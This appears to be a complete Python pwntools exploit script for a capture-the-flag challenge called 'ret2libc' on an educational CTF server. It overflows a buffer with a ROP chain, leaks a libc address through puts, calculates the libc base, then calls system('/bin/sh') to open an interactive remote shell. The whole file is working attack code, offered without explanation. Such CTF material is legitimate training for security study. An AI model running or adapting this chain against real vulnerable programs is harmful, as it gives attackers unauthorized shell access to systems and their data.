from pwn import *

local = False
elf = 'ret2libc' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "edu-ctf.csie.org"
    port = 10175
    r = remote(ip,port)

context.arch = 'amd64'
l = ELF('./libc.so')
raw_input("aaa")

pop_rdi = 0x0000000000400733
libc_start_main = 0x0000000000600ff0
put_plt = 0x400520
get_plt = 0x400530
main = 0x400698
ret = 0x400506

rop1 = flat(
    'a' * 0x38,
    pop_rdi,
    libc_start_main,
    put_plt,
    main
)

print(r.recvuntil(':D'))
r.sendline(rop1)
r.recvline()
l.address = u64( r.recv(6) + '\0\0' ) - 0x21ab0
success( 'libc_bass -> %s ' , hex( l.address ))


rop2 = flat(
    'a' * 0x38,
    ret,
    pop_rdi,
    l.search( '/bin/sh' ).next(),
    l.sym.system
)

print(r.recvuntil(':D'))
r.sendline(rop2)

r.interactive()
